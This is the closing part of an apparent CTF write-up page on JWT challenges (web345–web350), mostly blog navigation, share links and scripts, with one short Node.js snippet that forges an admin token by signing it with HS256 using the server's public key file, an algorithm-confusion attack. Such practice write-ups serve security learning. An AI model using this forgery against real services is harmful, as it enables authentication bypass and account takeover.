+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;public/public.key&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span> &#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(token)</span><br></pre></td></tr></table></figure>
+
+
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web345"><span class="toc-number">1.</span> <span class="toc-text">web345</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web346"><span class="toc-number">2.</span> <span class="toc-text">web346</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web347"><span class="toc-number">3.</span> <span class="toc-text">web347</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web348"><span class="toc-number">4.</span> <span class="toc-text">web348</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web349"><span class="toc-number">5.</span> <span class="toc-text">web349</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web350"><span class="toc-number">6.</span> <span class="toc-text">web350</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-jwt/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-jwt/&text=Practice - CTFSHOW WEB入门 JWT篇"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-jwt/&title=Practice - CTFSHOW WEB入门 JWT篇"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-jwt/&is_video=false&description=Practice - CTFSHOW WEB入门 JWT篇"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Practice - CTFSHOW WEB入门 JWT篇&body=Check out this article: https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-jwt/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-jwt/&title=Practice - CTFSHOW WEB入门 JWT篇"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-jwt/&title=Practice - CTFSHOW WEB入门 JWT篇"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-jwt/&title=Practice - CTFSHOW WEB入门 JWT篇"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-jwt/&title=Practice - CTFSHOW WEB入门 JWT篇"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-jwt/&name=Practice - CTFSHOW WEB入门 JWT篇&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-jwt/&t=Practice - CTFSHOW WEB入门 JWT篇"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    b_y
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.7/dist/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'recharging-runtime';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
